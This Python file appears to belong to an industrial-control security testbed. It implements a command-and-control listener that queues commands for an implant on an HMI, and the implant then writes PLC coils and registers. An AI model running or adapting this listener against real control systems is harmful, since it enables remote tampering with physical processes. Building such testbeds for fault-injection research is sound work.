#!/usr/bin/env python3
"""C2 listener for the compromised-HMI beacon model.

See docs/cyber-vs-physical-fault-injection-design.md.

Represents the attacker's C2 infrastructure on Kali. The implant already
running on HMI (scadalts/cyber_injects/beacon_client.py) periodically
connects here and asks "anything for me?" - this just holds whatever
command was queued (by writing to the state file - directly, or via
--queue at startup) and hands it out on the next check-in, then clears
it. The implant does the actual work; this side never talks to the PLC
at all, matching how a real C2 handler tells an implant what to do
without doing it itself.

Protocol: one JSON line per direction, newline-terminated.
  implant -> here:  {"beacon_id": "<any string>"}
  here -> implant:  {"cmd": null}
                     | {"cmd": {"action": "write_coil"|"write_register",
                                "address": int, "value": ...}}
"""
import argparse
import asyncio
import json
import os

STATE_FILE_DEFAULT = "/tmp/c2_pending_command.json"


def read_pending(state_file):
    if not os.path.exists(state_file):
        return None
    try:
        with open(state_file) as f:
            data = json.load(f)
        return data or None
    except Exception:
        return None


def clear_pending(state_file):
    try:
        os.remove(state_file)
    except FileNotFoundError:
        pass


async def handle_beacon(reader, writer, state_file):
    peer = writer.get_extra_info("peername")
    try:
        line = await asyncio.wait_for(reader.readline(), timeout=5)
        if not line:
            return
        beacon = json.loads(line.decode())
        cmd = read_pending(state_file)
        if cmd is not None:
            print(f"[c2_listener] beacon from {peer} ({beacon.get('beacon_id')}) "
                  f"- handing out queued command: {cmd}", flush=True)
            clear_pending(state_file)
        else:
            print(f"[c2_listener] beacon from {peer} ({beacon.get('beacon_id')}) "
                  f"- nothing queued", flush=True)
        writer.write((json.dumps({"cmd": cmd}) + "\n").encode())
        await writer.drain()
    except Exception as exc:
        print(f"[c2_listener] error handling beacon from {peer}: {exc}", flush=True)
    finally:
        writer.close()


async def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--listen-host", default="0.0.0.0")
    parser.add_argument("--listen-port", type=int, default=4444)
    parser.add_argument("--state-file", default=STATE_FILE_DEFAULT)
    parser.add_argument("--queue", help="JSON command to queue immediately on startup, e.g. "
                                         '\'{"action": "write_coil", "address": 0, "value": true}\'')
    args = parser.parse_args()

    if args.queue:
        with open(args.state_file, "w") as f:
            f.write(args.queue)
        print(f"[c2_listener] queued command from --queue: {args.queue}", flush=True)

    server = await asyncio.start_server(
        lambda r, w: handle_beacon(r, w, args.state_file), args.listen_host, args.listen_port
    )
    print(f"[c2_listener] listening on {args.listen_host}:{args.listen_port}, "
          f"state file {args.state_file}", flush=True)
    async with server:
        await server.serve_forever()


if __name__ == "__main__":
    asyncio.run(main())
